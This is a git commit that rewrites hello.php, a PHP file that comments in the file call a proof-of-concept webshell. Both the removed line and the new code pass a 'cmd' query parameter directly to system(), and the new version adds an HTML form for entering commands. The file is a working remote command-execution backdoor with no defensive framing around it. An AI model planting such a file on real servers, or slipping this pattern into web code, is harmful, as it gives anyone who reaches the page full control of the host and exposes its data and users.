869c9875c7024dba24cf1aa35e0588d2a80e61ba
hijohn3 <130885222+hijohn3@users.noreply.github.com>
2023-09-21 04:54:22 +0900

    Update hello.php

--- hello.php
+++ hello.php
@@ -1,3 +1,18 @@
 <?php
-system($_GET['cmd']); 
+
+//
+// PoC: a simple webshell 
+// Author: Bonghwan Choi
+//
+
+echo 'Enter a Command:<br>';
+echo '<form action="">';
+echo '<input type=text name="cmd">';
+echo '<input type="submit">';
+echo '</form>';
+
+if (isset($_GET['cmd'])) {
+	system($_GET['cmd']);
+}
+
 ?>
